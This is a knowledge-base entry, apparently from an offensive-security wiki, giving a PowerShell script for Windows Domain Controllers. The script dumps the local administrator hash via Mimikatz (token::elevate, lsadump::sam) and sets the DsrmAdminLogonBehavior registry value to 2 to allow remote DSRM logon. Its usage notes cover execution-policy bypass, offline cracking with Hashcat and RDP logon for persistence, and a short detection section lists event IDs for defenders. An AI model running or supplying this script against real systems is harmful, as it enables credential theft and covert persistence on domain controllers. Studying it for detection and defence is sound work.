---
id: 25ab5109-4d61-47d8-90ef-a6a963a5b9c5
name: PowerShell-DSRM-Hash-Dump-and-Activation-Script
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:08.502658+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - dsrm
  - credential-dumping
  - registry-modification
validated: true
---

# PowerShell-DSRM-Hash-Dump-and-Activation-Script

## Code

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# Create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# Change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

## Description

This PowerShell script automates the dumping of the local administrator hash from the SAM using Mimikatz and configures the DSRM remote logon behavior in the registry to enable remote access for the administrator account on a Windows Domain Controller. It combines privilege escalation, hash extraction, and registry modification into a single executable sequence for efficient post-exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This script has no user-defined variables; assumes Mimikatz is accessible via Invoke-Mimikatz alias or PATH. | N/A |

## Usage

Save the script as dsrm-activation.ps1 on the target system and execute from an elevated PowerShell prompt: `powershell -ExecutionPolicy Bypass -File dsrm-activation.ps1`. Use after obtaining DSRM credentials for persistence on Domain Controllers. Crack the dumped hash offline with tools like Hashcat, then use the plaintext password for remote logon (e.g., RDP) once registry changes take effect (may require reboot).

## Detection

- Monitor PowerShell execution logs for Invoke-Mimikatz or lsadump commands (Module Logging, Event ID 4104).
- Audit registry changes to HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA (Event ID 4657).
- Detect Mimikatz via process signatures, LSASS access (Sysmon EID 10), or YARA rules for the executable.
- Alert on DSRM account logons (Event ID 4624 with logon type 10) and unexpected admin hash dumps.

## Related

- [[procedures/Dump-Local-Administrator-Hash-and-Activate-with-DSRM]]
- [[tools/Mimikatz]]
